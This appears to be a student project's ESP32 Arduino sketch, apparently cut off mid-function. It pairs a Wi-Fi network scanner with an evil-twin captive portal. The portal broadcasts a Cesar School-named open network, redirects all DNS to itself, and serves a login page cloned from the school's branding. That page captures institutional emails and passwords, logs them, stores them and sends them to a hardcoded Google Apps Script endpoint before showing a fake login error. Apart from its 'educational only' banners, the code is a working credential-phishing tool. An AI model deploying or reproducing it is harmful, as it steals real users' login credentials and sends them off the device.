/*
######################################################## 
# Faculdade: Cesar School                              #
# Curso: Segurança da Informação                       #
# Período: 2025.2                                      #
# Disciplina: Algoritmos e Estrutura de Dados          #
# Professor: Ferando Ferreira De Carvalho              #
# Projeto: CyberAuditESP32                             #
# Equipe:                                              #
#           Artur Torres Lima Cavalcanti               #
#           Carlos Vinicius Alves de Figueiredo        #
#           Eduardo Henrique Ferreira Fonseca Barbosa  #
#           Gabriel de Medeiros Almeida                #
#           Mauro Sérgio Rezende da Silva              #
#           Silvio Barros Tenório                      #
# Versão: 1.0                                          #
# Data: 22/11/2025                                     #
######################################################## 
*/

#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
#include <ArduinoJson.h>
#include <HTTPClient.h>
#include <WiFiManager.h>
#define LED 2

// Configurações do servidor web
WebServer server(80);
DNSServer dnsServer;

// Configurações do portal captivo
const char* captivePortalSSID = "Cesar_School_contingencia";
const char* captivePortalPassword = "";

// Estrutura para armazenar informações das redes
struct NetworkInfo {
  String ssid;
  int rssi;
  String bssid;
  int channel;
  String encryption;
};

// Array para armazenar redes encontradas
NetworkInfo networks[50];
int networkCount = 0;

// Modo de operação
enum OperationMode {
  SCANNER_MODE,
  CAPTIVE_PORTAL_MODE
};

OperationMode currentMode = SCANNER_MODE;
unsigned long lastScan = 0;
const unsigned long scanInterval = 10000; // 10 segundos

// Configuração do Google Apps Script
const char* googleScriptURL = "https://script.google.com/macros/s/AKfycbzIx0aVa7uB7T_JS6iECIRvJr1I0D2AYGNrVw5TwiwilYnI598aWAt6JGwtFpUFWpkD/exec";

// Configurações WiFi para conectar à internet
//const char* wifiSSID = "";
//const char* wifiPassword = "";
String wifiSSID, wifiPassword;

// Estrutura para dados capturados
struct CapturedData {
  String username;
  String password;
  String ip;
  unsigned long timestamp;
};

// Array para armazenar dados localmente
CapturedData capturedCredentials[200];
int credentialCount = 0;

// Declarações de função
void printMenu();
void handleSerialCommands();
void startScannerMode();
void handleScannerMode();
void scanNetworks();
void startCaptivePortalMode();
void handleCaptivePortalMode();
void handleRoot();
void handleLogin();
void handleNotFound();
void handleCaptivePortalResponse();
void showFoundNetworks();
void performSecurityAnalysis();
void sendToGoogleSheets(String username, String password, String ip);
void saveCredentialsLocally(String username, String password, String ip);
void showStoredCredentials();
void configuraWiFi(int modo);
void connectToWiFiAndSync();
void autoSyncCheck();

// SETUP
void setup() {
  Serial.begin(115200);
  delay(1000);
  
  pinMode(LED,OUTPUT);
  digitalWrite(LED,LOW);

  Serial.println();
  Serial.println("=== ESP32 WiFi Security Audit ===");
  Serial.println("APENAS PARA FINS EDUCATIVOS!");
  Serial.println();
  
  // Configura o modo WiFi
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);
  
  Serial.println("Sistema iniciado com sucesso!");
  Serial.printf("Capacidade: %d credenciais em RAM\n", 200);
  
  // Configura WiFi
  configuraWiFi(0);

  // Menu inicial
  printMenu();
  
  // Inicia no modo scanner
  startScannerMode();
}

// LOOP
void loop() {
  switch(currentMode) {
    case SCANNER_MODE:
      handleScannerMode();
      break;
      
    case CAPTIVE_PORTAL_MODE:
      handleCaptivePortalMode();
      break;
  }
  
  // Verifica comandos seriais
  handleSerialCommands();
  
  // Verifica se precisa sincronizar automaticamente
  autoSyncCheck();
  
  delay(100);
}

void printMenu() {
  Serial.println("Comandos disponíveis:");
  Serial.println("1 - Modo Scanner de Redes");
  Serial.println("2 - Portal Captivo");
  Serial.println("3 - Mostrar redes encontradas");
  Serial.println("4 - Análise de segurança");
  Serial.println("5 - Mostrar credenciais capturadas");
  Serial.println("6 - Configurar WiFi ESP32");
  Serial.println("7 - Conectar WiFi e sincronizar dados");
  Serial.println("h - Mostrar este menu");
  Serial.println();
}

void handleSerialCommands() {
  if (Serial.available()) {
    char command = Serial.read();
    
    switch(command) {
      case '1':
        startScannerMode();
        break;
        
      case '2':
        startCaptivePortalMode();
        break;
        
      case '3':
        showFoundNetworks();
        break;
        
      case '4':
        performSecurityAnalysis();
        break;
        
      case '5':
        showStoredCredentials();
        break;

      case '6':
        configuraWiFi(1);
        break;
        
      case '7':
        connectToWiFiAndSync();
        break;
        
      case 'h':
        printMenu();
        break;
    }
  }
}

void startScannerMode() {
  Serial.println("Iniciando modo Scanner de Redes...");
  currentMode = SCANNER_MODE;
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  digitalWrite(LED,LOW);
}

void handleScannerMode() {
  if (millis() - lastScan > scanInterval) {
    Serial.println("Escaneando redes WiFi...");
    scanNetworks();
    lastScan = millis();
  }
}

void scanNetworks() {
  int n = WiFi.scanNetworks();
  networkCount = 0;
  
  if (n == 0) {
    Serial.println("Nenhuma rede encontrada");
  } else {
    Serial.printf("Encontradas %d redes:\n", n);
    Serial.println("ID | SSID                     | RSSI | CH | Segurança");
    Serial.println("---|--------------------------|------|----|-----------");
    
    for (int i = 0; i < n && networkCount < 50; ++i) {
      networks[networkCount].ssid = WiFi.SSID(i);
      networks[networkCount].rssi = WiFi.RSSI(i);
      networks[networkCount].bssid = WiFi.BSSIDstr(i);
      networks[networkCount].channel = WiFi.channel(i);
      
      // Determina o tipo de encriptação
      wifi_auth_mode_t encType = WiFi.encryptionType(i);
      switch(encType) {
        case WIFI_AUTH_OPEN:
          networks[networkCount].encryption = "ABERTA";
          break;
        case WIFI_AUTH_WEP:
          networks[networkCount].encryption = "WEP";
          break;
        case WIFI_AUTH_WPA_PSK:
          networks[networkCount].encryption = "WPA";
          break;
        case WIFI_AUTH_WPA2_PSK:
          networks[networkCount].encryption = "WPA2";
          break;
        case WIFI_AUTH_WPA_WPA2_PSK:
          networks[networkCount].encryption = "WPA/WPA2";
          break;
        case WIFI_AUTH_WPA2_ENTERPRISE:
          networks[networkCount].encryption = "WPA2 Enterprise";
          break;
        case WIFI_AUTH_WPA3_PSK:
          networks[networkCount].encryption = "WPA3";
          break;
        default:
          networks[networkCount].encryption = "DESCONHECIDA";
      }
      
      Serial.printf("%2d | %-24s | %4d | %2d | %s\n", 
                   i+1, 
                   networks[networkCount].ssid.c_str(),
                   networks[networkCount].rssi,
                   networks[networkCount].channel,
                   networks[networkCount].encryption.c_str());
      
      networkCount++;
    }
    Serial.println();
  }
  
  WiFi.scanDelete();
}

void startCaptivePortalMode() {
  Serial.println("Iniciando Portal Captivo...");
  Serial.println("ATENÇÃO: APENAS PARA FINS EDUCATIVOS!");

  currentMode = CAPTIVE_PORTAL_MODE;
  
  // Para o servidor atual se estiver rodando
  server.stop();
  
  // Configura como Access Point
  WiFi.mode(WIFI_AP);
  WiFi.softAP(captivePortalSSID, captivePortalPassword);
  
  // Aguarda um pouco para o AP estabilizar
  delay(500);
  
  IPAddress apIP = WiFi.softAPIP();
  
  // Configura o servidor DNS para capturar TODOS os domínios
  dnsServer.stop();
  dnsServer.start(53, "*", apIP);
  
  // Configura as rotas do servidor web
  server.on("/", HTTP_GET, handleRoot);
  server.on("/login", HTTP_POST, handleLogin);
  server.on("/login", HTTP_GET, handleRoot);  // Redireciona GET para root
  
  // Rotas comuns para detecção de portal captivo
  server.on("/generate_204", HTTP_GET, handleCaptivePortalResponse);  // Android
  server.on("/gen_204", HTTP_GET, handleCaptivePortalResponse);       // Android alternativo
  server.on("/fwlink", HTTP_GET, handleRoot);                        // Microsoft
  server.on("/hotspot-detect.html", HTTP_GET, handleRoot);           // Apple iOS
  server.on("/connectivity-check.html", HTTP_GET, handleCaptivePortalResponse); // Android
  server.on("/check_network_status.txt", HTTP_GET, handleCaptivePortalResponse); // Android
  server.on("/ncsi.txt", HTTP_GET, handleCaptivePortalResponse);      // Microsoft
  server.on("/success.txt", HTTP_GET, handleCaptivePortalResponse);   // Ubuntu
  
  // Captura todas as outras requisições
  server.onNotFound(handleNotFound);
  
  server.begin();
  
  Serial.print("Portal Captivo iniciado em: ");
  Serial.println(apIP);
  Serial.println("SSID: " + String(captivePortalSSID));
  Serial.println("DNS Server configurado para capturar todos os domínios");
  digitalWrite(LED,HIGH);
}

void handleCaptivePortalMode() {
  dnsServer.processNextRequest();
  server.handleClient();
}

void handleRoot() {
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Cesar School- Acesso WiFi</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta charset='UTF-8'>";
  html += "<style>";
  html += "body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(#6b6767,#6b6767,#6b6767);margin:0;padding:20px;min-height:100vh;}";
  html += ".container{max-width:400px;margin:50px auto;background:white;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.3);overflow:hidden;}";
  html += ".header{background:#FF6002;color:white;text-align:center;padding:20px;}";
  html += ".logo{width:120px;height:60px;margin:0 auto 15px;display:block;}";
  html += ".content{padding:30px;}";
  html += "h1{margin:0;font-size:18px;font-weight:normal;}";
  html += "h2{color:#FF6002;margin-bottom:20px;text-align:center;}";
  html += "p{color:#666;text-align:center;margin-bottom:25px;}";
  html += "input{width:100%;padding:12px;margin:8px 0;border:2px solid #ddd;border-radius:8px;font-size:16px;box-sizing:border-box;}";
  html += "input:focus{border-color:#FF6002;outline:none;}";
  html += "button{width:100%;padding:12px;background:#FF6002;color:white;border:none;border-radius:8px;cursor:pointer;font-size:16px;margin-top:10px;}";
  html += "button:hover{background:#6b6767;}";
  html += ".footer{text-align:center;padding:20px;color:#999;font-size:12px;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<svg width='80' height='80' xmlns='http://www.w3.org/2000/svg' xmlns:svg='http://www.w3.org/2000/svg'>";
  html += "<defs>";
  html += "  <clipPath id='clip0_1505_47595'>";
  html += "   <rect fill='white' height='500' id='svg_1' width='560.11'/>";
  html += "  </clipPath>";
  html += " </defs>";
  html += " <g class='layer'>";
  html += "  <title>Layer 1</title>";
  html += "  <g clip-path='url(#clip0_1505_47595)' id='svg_2'>";
  html += "   <path d='m12.49,63.54c0.7,0 1.75,0.34 2.41,1.07c0.07,0.07 0.15,0.12 0.25,0.11c0.09,-0.01 0.18,-0.05 0.24,-0.13l0.62,-0.81c0.12,-0.16 0.11,-0.41 -0.03,-0.55c-1.09,-1.13 -2.56,-1.53 -3.49,-1.53c-1.64,0 -3.41,0.95 -3.41,3.04c0,1.94 1.73,2.52 3.27,3.02c0.82,0.26 2.06,0.66 2.06,1.24c0,0.94 -1.18,1.19 -1.81,1.19c-0.63,0 -1.64,-0.28 -2.39,-1.05c-0.13,-0.14 -0.34,-0.13 -0.46,0.01l-0.65,0.73c-0.07,0.07 -0.1,0.17 -0.1,0.28c0,0.11 0.04,0.21 0.1,0.28c0.98,1.09 2.46,1.57 3.5,1.57c1.69,0 3.41,-1.04 3.41,-3.02c0,-1.98 -1.75,-2.56 -3.29,-3.06l-0.04,-0.01c-0.95,-0.3 -2.02,-0.65 -2.02,-1.19c0,-0.95 1.15,-1.2 1.82,-1.2l0,0z' fill='#FFFFFF' id='svg_3'/>";
  html += "   <path d='m27.07,68.85c-0.07,-0.07 -0.16,-0.12 -0.25,-0.11c-0.09,0.01 -0.18,0.05 -0.24,0.13c-0.6,0.8 -1.42,1.28 -2.18,1.28c-1.4,0 -2.54,-1.27 -2.54,-2.84l0,-0.92c0,-1.55 1.14,-2.82 2.54,-2.82c0.76,0 1.58,0.48 2.18,1.27c0.06,0.08 0.15,0.13 0.24,0.13c0.09,0.01 0.18,-0.03 0.25,-0.11l0.68,-0.75c0.13,-0.14 0.14,-0.38 0.02,-0.54c-0.91,-1.19 -2.17,-1.9 -3.37,-1.9c-2.29,0 -4.16,2.11 -4.16,4.71l0,0.92c0,2.6 1.87,4.71 4.16,4.71c1.2,0 2.46,-0.7 3.37,-1.87c0.12,-0.16 0.11,-0.4 -0.02,-0.54l-0.68,-0.75l0,0z' fill='#FFFFFF' id='svg_4'/>";
  html += "   <path d='m35.52,61.83c-0.67,0 -1.34,0.24 -1.94,0.67l0,-4.3c0,-0.22 -0.15,-0.39 -0.34,-0.39l-0.94,0c-0.19,0 -0.34,0.18 -0.34,0.39l0,13.42c0,0.22 0.15,0.39 0.34,0.39l0.94,0c0.19,0 0.34,-0.17 0.34,-0.39l0.02,-5.8c0,-1.17 0.86,-2.12 1.92,-2.12c1.06,0 1.94,0.95 1.94,2.12l0,5.8c0,0.22 0.15,0.39 0.34,0.39l0.93,0c0.19,0 0.34,-0.18 0.34,-0.39l0,-5.8c0,-2.17 -1.62,-4 -3.54,-4l0,0z' fill='#FFFFFF' id='svg_5'/>";
  html += "   <path d='m70.87,71.14l-0.29,-0.99c-0.03,-0.1 -0.09,-0.18 -0.18,-0.23c-0.08,-0.04 -0.18,-0.05 -0.26,-0.01c-0.37,0.16 -0.68,0.24 -0.95,0.24c-0.72,0 -1.03,-0.37 -1.03,-1.24l0,-10.7c0,-0.22 -0.15,-0.39 -0.34,-0.39l-0.94,0c-0.19,0 -0.34,0.18 -0.34,0.39l0,10.7c0,1.98 0.96,3.11 2.65,3.11c0.4,0 0.87,-0.17 1.42,-0.36l0.05,-0.02c0.09,-0.03 0.16,-0.1 0.2,-0.2c0.04,-0.09 0.05,-0.2 0.02,-0.3l0,0z' fill='#FFFFFF' id='svg_6'/>";
  html += "   <path d='m47.64,61.69c1.19,0 2.31,0.54 3.15,1.51l2.01,2.33l2.01,-2.33c0.84,-0.97 1.96,-1.51 3.15,-1.51c0.2,0 0.36,0.19 0.36,0.41l0,1.03c0,0.23 -0.16,0.41 -0.36,0.41c-0.76,0 -1.48,0.34 -2.01,0.96l-2.01,2.32l2.01,2.33c0.54,0.62 1.25,0.96 2.01,0.96c1.57,0 2.85,-1.47 2.85,-3.29c0,-0.23 0.16,-0.41 0.36,-0.41l0.89,0c0.2,0 0.36,0.19 0.36,0.41c0,2.84 -2,5.15 -4.46,5.15c-1.19,0 -2.31,-0.54 -3.15,-1.51l-2.01,-2.32l-2.01,2.32c-0.84,0.97 -1.96,1.51 -3.15,1.51c-2.46,0 -4.46,-2.31 -4.46,-5.15c0,-2.84 2,-5.15 4.46,-5.15l0,0zm0,8.43c0.76,0 1.48,-0.34 2.01,-0.96l2.01,-2.33l-2.01,-2.33c-0.54,-0.62 -1.25,-0.96 -2.01,-0.96c-1.57,0 -2.85,1.47 -2.85,3.29c0,1.81 1.28,3.29 2.85,3.29l0,0z' fill='#FFFFFF' id='svg_7'/>";
  html += "   <path clip-rule='evenodd' d='m12.92,49.52c0.08,-0.17 0.05,-0.31 -0.12,-0.43l-0.28,-0.24c-0.13,-0.11 -0.26,-0.07 -0.37,0.11c-0.02,0.05 -0.06,0.12 -0.12,0.21c-0.05,0.09 -0.12,0.18 -0.2,0.28c-0.16,0.21 -0.41,0.32 -0.75,0.33c-0.35,-0.01 -0.62,-0.15 -0.81,-0.42c-0.19,-0.27 -0.28,-0.57 -0.28,-0.91l0,-2.31c0,-0.35 0.09,-0.66 0.28,-0.92c0.19,-0.26 0.46,-0.4 0.81,-0.41c0.17,0 0.32,0.03 0.45,0.09c0.12,0.07 0.23,0.16 0.31,0.25c0.08,0.08 0.15,0.18 0.2,0.28c0.05,0.08 0.08,0.16 0.1,0.24c0.1,0.16 0.23,0.18 0.37,0.07l0.3,-0.25c0.08,-0.07 0.12,-0.14 0.13,-0.24c0,-0.07 -0.02,-0.14 -0.05,-0.2c-0.05,-0.17 -0.2,-0.41 -0.47,-0.74c-0.13,-0.14 -0.31,-0.27 -0.53,-0.37c-0.23,-0.1 -0.49,-0.15 -0.8,-0.15c-0.61,0.01 -1.1,0.24 -1.47,0.7c-0.38,0.46 -0.57,1.01 -0.57,1.66l0,2.3c0,0.64 0.19,1.19 0.57,1.64c0.37,0.46 0.86,0.7 1.47,0.71c0.3,-0.01 0.57,-0.07 0.79,-0.17c0.22,-0.1 0.4,-0.22 0.54,-0.36c0.15,-0.14 0.26,-0.29 0.35,-0.44c0.07,-0.13 0.12,-0.24 0.15,-0.32l0,0zm14.64,-3.22c-0.01,-0.65 -0.19,-1.2 -0.56,-1.66c-0.36,-0.46 -0.86,-0.69 -1.49,-0.7c-0.61,0.01 -1.1,0.24 -1.47,0.7c-0.38,0.46 -0.57,1.01 -0.57,1.66l0,2.3c0,0.64 0.19,1.19 0.57,1.64c0.37,0.46 0.86,0.7 1.47,0.71c0.52,-0.01 0.94,-0.15 1.26,-0.42c0.16,-0.14 0.3,-0.27 0.41,-0.41c0.1,-0.14 0.2,-0.29 0.27,-0.43c0.04,-0.07 0.06,-0.14 0.06,-0.23c-0.01,-0.08 -0.05,-0.16 -0.13,-0.22l-0.27,-0.23c-0.06,-0.06 -0.12,-0.08 -0.18,-0.07c-0.08,0.01 -0.14,0.05 -0.19,0.13c-0.1,0.18 -0.25,0.36 -0.45,0.55c-0.21,0.19 -0.47,0.3 -0.79,0.31c-0.35,-0.01 -0.62,-0.15 -0.81,-0.42c-0.19,-0.27 -0.28,-0.57 -0.28,-0.91l0,-0.35c0,-0.22 0.09,-0.32 0.27,-0.32l2.32,0c0.36,0 0.54,-0.21 0.55,-0.64l0,-0.99l0,0zm-0.95,0.35c0,0.21 -0.09,0.32 -0.27,0.32l-1.64,0c-0.18,0 -0.27,-0.11 -0.27,-0.32l0,-0.35c0,-0.36 0.1,-0.66 0.28,-0.93c0.19,-0.26 0.46,-0.4 0.81,-0.41c0.35,0.01 0.62,0.14 0.81,0.41c0.19,0.26 0.29,0.57 0.29,0.93l0,0.35l0,0zm15.38,1.97c-0.01,-0.68 -0.21,-1.18 -0.61,-1.51c-0.39,-0.32 -0.87,-0.49 -1.44,-0.51c-0.02,0.01 -0.19,-0.04 -0.49,-0.15c-0.14,-0.06 -0.25,-0.15 -0.33,-0.28c-0.11,-0.11 -0.16,-0.27 -0.16,-0.48c0,-0.19 0.07,-0.38 0.21,-0.59c0.14,-0.2 0.4,-0.31 0.78,-0.32c0.31,0 0.58,0.14 0.83,0.41c0.13,0.13 0.25,0.14 0.39,0.04l0.3,-0.25c0.15,-0.12 0.16,-0.26 0.04,-0.43c-0.17,-0.22 -0.37,-0.41 -0.62,-0.56c-0.26,-0.14 -0.57,-0.21 -0.93,-0.22c-0.63,0.01 -1.1,0.21 -1.42,0.61c-0.32,0.39 -0.48,0.83 -0.48,1.32c0.02,1.15 0.65,1.79 1.91,1.92c0.03,-0.01 0.21,0.03 0.55,0.11c0.14,0.05 0.27,0.15 0.39,0.29c0.1,0.15 0.16,0.34 0.16,0.59c0,0.28 -0.08,0.54 -0.25,0.77c-0.17,0.24 -0.45,0.37 -0.84,0.38c-0.28,0 -0.53,-0.1 -0.74,-0.29c-0.21,-0.18 -0.38,-0.38 -0.52,-0.6c-0.09,-0.16 -0.21,-0.18 -0.36,-0.09l-0.28,0.24c-0.14,0.13 -0.17,0.28 -0.08,0.45c0.15,0.29 0.39,0.58 0.71,0.86c0.32,0.29 0.75,0.44 1.28,0.46c0.65,-0.01 1.15,-0.22 1.51,-0.64c0.35,-0.41 0.53,-0.92 0.53,-1.54l0,0zm14.56,-2.47c-0.01,-0.65 -0.19,-1.2 -0.56,-1.66c-0.36,-0.46 -0.86,-0.69 -1.48,-0.7c-0.61,0.01 -1.1,0.24 -1.47,0.7c-0.38,0.46 -0.57,1.01 -0.57,1.66l0,4.19c0,0.21 0.09,0.31 0.27,0.31l0.41,0c0.18,0 0.27,-0.1 0.27,-0.31l0,-2.25c0,-0.22 0.09,-0.32 0.27,-0.32l1.64,0c0.18,0 0.27,0.11 0.27,0.32l0,2.25c0,0.21 0.09,0.31 0.27,0.31l0.41,0c0.18,0 0.27,-0.1 0.27,-0.31l0,-4.19l0,0zm-0.95,0.35c0,0.21 -0.09,0.32 -0.27,0.32l-1.64,0c-0.18,0 -0.27,-0.11 -0.27,-0.32l0,-0.35c0,-0.36 0.1,-0.66 0.28,-0.93c0.19,-0.26 0.46,-0.4 0.81,-0.41c0.35,0.01 0.62,0.15 0.81,0.41c0.19,0.26 0.28,0.57 0.28,0.93l0,0.35l0,0zm15.5,2.6c0,-0.44 -0.06,-0.8 -0.17,-1.06c-0.12,-0.25 -0.25,-0.44 -0.41,-0.56c-0.1,-0.11 -0.1,-0.21 0,-0.31c0.1,-0.07 0.22,-0.2 0.36,-0.41c0.14,-0.2 0.21,-0.5 0.22,-0.9c-0.01,-0.66 -0.2,-1.17 -0.57,-1.52c-0.39,-0.36 -0.88,-0.54 -1.47,-0.54c-0.61,0.01 -1.1,0.24 -1.47,0.7c-0.38,0.46 -0.57,1.01 -0.57,1.66l0,4.19c0,0.21 0.09,0.31 0.27,0.31l0.41,0c0.18,0 0.27,-0.1 0.27,-0.31l0,-2.25c0,-0.22 0.09,-0.32 0.27,-0.32l0.82,0c0.35,0.01 0.62,0.14 0.81,0.41c0.19,0.26 0.28,0.57 0.28,0.92l0,1.24c0,0.21 0.09,0.31 0.27,0.31l0.41,0c0.18,0 0.27,-0.1 0.27,-0.31l0,-1.24l0,0zm-0.95,-3.25c-0.02,0.4 -0.16,0.66 -0.42,0.78c-0.26,0.14 -0.48,0.2 -0.67,0.19l-0.82,0c-0.18,0 -0.27,-0.11 -0.27,-0.32l0,-0.35c0,-0.36 0.1,-0.66 0.29,-0.93c0.19,-0.26 0.46,-0.4 0.81,-0.41c0.31,0 0.56,0.08 0.77,0.25c0.21,0.17 0.31,0.44 0.32,0.79l0,0z' fill='#FFFFFF' fill-rule='evenodd' id='svg_8'/>";
  html += "   <path clip-rule='evenodd' d='m33.59,8c-14,1.39 -24.56,7.23 -24.56,14.17c0,7.98 13.94,14.49 31.02,14.49c17.09,0 31.02,-6.51 31.02,-14.49c0,-6.94 -10.56,-12.78 -24.56,-14.17l0,0.67c7.25,1 12.45,4.79 12.45,7.87c0,3.95 -8.49,7.16 -18.91,7.16c-10.41,0 -18.91,-3.22 -18.91,-7.16c0,-3.09 5.2,-6.69 12.45,-7.7l0,-0.84l0,0z' fill='#FFFFFF' fill-rule='evenodd' id='svg_9'/>";
  html += "   <path clip-rule='evenodd' d='m37.33,9.72c-5.8,0.51 -10.18,2.66 -10.18,5.22c0,2.94 5.78,5.34 12.86,5.34c7.08,0 12.86,-2.4 12.86,-5.34c0,-2.56 -4.38,-4.71 -10.18,-5.22l0,0.67c3,0.37 5.16,1.34 5.16,2.48c0,1.45 -3.52,2.64 -7.84,2.64c-4.32,0 -7.84,-1.19 -7.84,-2.64c0,-1.14 2.16,-2.11 5.16,-2.48l0,-0.67z' fill='#FFFFFF' fill-rule='evenodd' id='svg_10'/>";
  html += "<path clip-rule='evenodd' d='m18.62,50.39c0,-0.14 -0.06,-0.21 -0.17,-0.22l-0.26,0c-0.11,0.01 -0.17,0.08 -0.17,0.22l0,0.2c0,0.14 0.06,0.21 0.17,0.21l0.26,0c0.11,-0.01 0.17,-0.08 0.17,-0.21l0,-0.2z' fill='#FFFFFF' fill-rule='evenodd' id='svg_11'/>";
  html += "<path clip-rule='evenodd' d='m33.14,50.38c0,-0.14 -0.06,-0.21 -0.17,-0.22l-0.26,0c-0.11,0.01 -0.17,0.08 -0.17,0.22l0,0.2c0,0.14 0.06,0.21 0.17,0.21l0.26,0c0.11,-0.01 0.17,-0.08 0.17,-0.21l0,-0.2z' fill='#FFFFFF' fill-rule='evenodd' id='svg_12'/>";
  html += "   <path clip-rule='evenodd' d='m47.56,50.4c0,-0.14 -0.06,-0.21 -0.17,-0.22l-0.26,0c-0.11,0.01 -0.17,0.08 -0.17,0.22l0,0.2c0,0.14 0.06,0.21 0.17,0.21l0.26,0c0.11,-0.01 0.17,-0.08 0.17,-0.21l0,-0.2z' fill='#FFFFFF' fill-rule='evenodd' id='svg_13'/>";
  html += "<path clip-rule='evenodd' d='m61.99,50.38c0,-0.14 -0.06,-0.21 -0.17,-0.22l-0.26,0c-0.12,0.01 -0.17,0.08 -0.17,0.22l0,0.2c0,0.14 0.06,0.21 0.17,0.21l0.26,0c0.11,-0.01 0.17,-0.08 0.17,-0.21l0,-0.2z' fill='#FFFFFF' fill-rule='evenodd' id='svg_14'/>";
  html += "  </g>";
  html += " </g>";
  html += "</svg>";
  html += "</div>";
  html += "<div class='content'>";
  html += "<h2>Acesso à Rede WiFi Acadêmica</h2>";
  html += "<p>Para acessar a internet, faça login com suas credenciais institucionais Cesar School.</p>";
  html += "<form action='/login' method='POST'>";
  html += "<input type='text' name='username' placeholder='Email Institucional' required>";
  html += "<input type='password' name='password' placeholder='Senha' required>";
  html += "<button type='submit'>Conectar</button>";
  html += "</form>";
  html += "</div>";
  html += "<div class='footer'>";
  html += "<p>Sistema de Autenticação WiFi Cesar School<br>Suporte: ti@cesar.school</p>";
  html += "</div>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

void handleLogin() {
  String username = server.arg("username");
  String password = server.arg("password");
  String clientIP = server.client().remoteIP().toString();
  
  // Log das credenciais (apenas para demonstração educativa)
  Serial.println("===    CREDENCIAIS CAPTURADAS     ===");
  Serial.println("Username: " + username);
  Serial.println("Password: " + password);
  Serial.println("IP do cliente: " + clientIP);
  Serial.println("=====================================");
  
  // Salvar localmente primeiro
  saveCredentialsLocally(username, password, clientIP);
  
  // Enviar para Google Sheets
  sendToGoogleSheets(username, password, clientIP);
  
  // Resposta simulando erro de autenticação
  String html = "<!DOCTYPE html><html><head>";
  html += "<title>Cesar School - Erro de Autenticação</title>";
  html += "<meta name='viewport' content='width=device-width, initial-scale=1'>";
  html += "<meta charset='UTF-8'>";
  html += "<style>";
  html += "body{font-family:'Segoe UI',Arial,sans-serif;background:linear-gradient(#6b6767,#6b6767,#6b6767);margin:0;padding:20px;min-height:100vh;}";
  html += ".container{max-width:400px;margin:50px auto;background:white;border-radius:15px;box-shadow:0 10px 30px rgba(0,0,0,0.3);overflow:hidden;}";
  html += ".header{background:#d32f2f;color:white;text-align:center;padding:20px;}";
  html += ".content{padding:30px;text-align:center;}";
  html += "h1{margin:0;font-size:18px;font-weight:normal;}";
  html += "h2{color:#d32f2f;margin-bottom:20px;}";
  html += "p{color:#666;margin-bottom:20px;}";
  html += "a{color:#1e3c72;text-decoration:none;font-weight:bold;}";
  html += "a:hover{text-decoration:underline;}";
  html += ".footer{text-align:center;padding:20px;color:#999;font-size:12px;}";
  html += "</style></head><body>";
  html += "<div class='container'>";
  html += "<div class='header'>";
  html += "<h1>❌ Falha na Autenticação</h1>";
  html += "</div>";
  html += "<div class='content'>";
  html += "<h2>Credenciais Inválidas</h2>";
  html += "<p>Verifique seu email institucional e senha e tente novamente.</p>";
  html += "<p>Se o problema persistir, entre em contato com o suporte técnico.</p>";
  html += "<p><a href='/'>← Voltar ao Login</a></p>";
  html += "</div>";
  html += "<div class='footer'>";
  html += "<p>Sistema de Autenticação WiFi Cesar School<br>Suporte: ti@cesar.school</p>";
  html += "</div>";
  html += "</div></body></html>";
  
  server.send(200, "text/html", html);
}

void handleCaptivePortalResponse() {
  Serial.println("Detectada verificação de conectividade - redirecionando para portal");
  
  // Para Android e outros sistemas que esperam código 204
  String html = "<!DOCTYPE html><html><head>";
  html += "<meta http-equiv='refresh' content='0; url=http://";
  html += WiFi.softAPIP().toString();
  html += "/'>";
  html += "<script>window.location.href='http://";
  html += WiFi.softAPIP().toString();
  html += "/';</script>";
  html += "</head><body>";
  html += "<p>Redirecionando para portal de login...</p>";
  html += "<a href='http://";
  html += WiFi.softAPIP().toString();
  html += "/'>Clique aqui se não for redirecionado automaticamente</a>";
  html += "</body></html>";
  
  server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
  server.send(302, "text/html", html);
}

void handleNotFound() {
  // Log da requisição para debug
  String uri = server.uri();
  String method = (server.method() == HTTP_GET) ? "GET" : "POST";
  String host = server.hostHeader();
  
  Serial.println("=== REQUISIÇÃO CAPTURADA ===");
  Serial.println("  Host: " + host);
  Serial.println("  Método: " + method);
  Serial.println("  URI: " + uri);
  Serial.println("  IP Cliente: " + server.client().remoteIP().toString());
  Serial.println("============================");
  
  // Se não for uma requisição para nosso IP, force redirecionamento
  if (host != WiFi.softAPIP().toString()) {
    Serial.println("Redirecionando requisição externa para portal captivo");
    
    String html = "<!DOCTYPE html><html><head>";
    html += "<meta http-equiv='refresh' content='0; url=http://";
    html += WiFi.softAPIP().toString();
    html += "/'>";
    html += "<script>";
    html += "setTimeout(function(){";
    html += "window.location.href='http://";
    html += WiFi.softAPIP().toString();
    html += "/';";
    html += "}, 100);";
    html += "</script>";
    html += "</head><body>";
    html += "<h2>Redirecionando...</h2>";
    html += "<p>Você será redirecionado para o login.</p>";
    html += "<p><a href='http://";
    html += WiFi.softAPIP().toString();
    html += "/'>Clique aqui se não for redirecionado</a></p>";
    html += "</body></html>";
    
    server.sendHeader("Location", "http://" + WiFi.softAPIP().toString() + "/", true);
    server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
    server.sendHeader("Pragma", "no-cache");
    server.sendHeader("Expires", "-1");
    server.send(302, "text/html", html);
  } else {
    // Se for para nosso IP mas rota não encontrada, vai para root
    handleRoot();
  }
}

void showFoundNetworks() {
  Serial.println("\n=== REDES ENCONTRADAS ===");
  if (networkCount == 0) {
    Serial.println("Nenhuma rede foi escaneada ainda. Use o comando '1' para escanear.");
    return;
  }
  
  for (int i = 0; i < networkCount; i++) {
    Serial.printf("Rede %d:\n", i+1);
    Serial.printf("  SSID: %s\n", networks[i].ssid.c_str());
    Serial.printf("  BSSID: %s\n", networks[i].bssid.c_str());
    Serial.printf("  RSSI: %d dBm\n", networks[i].rssi);
    Serial.printf("  Canal: %d\n", networks[i].channel);
    Serial.printf("  Segurança: %s\n", networks[i].encryption.c_str());
    Serial.println();
  }
}

void performSecurityAnalysis() {
  Serial.println("\n=== ANÁLISE DE SEGURANÇA ===");
  
  if (networkCount == 0) {
    Serial.println("Nenhuma rede para analisar. Execute um scan primeiro.");
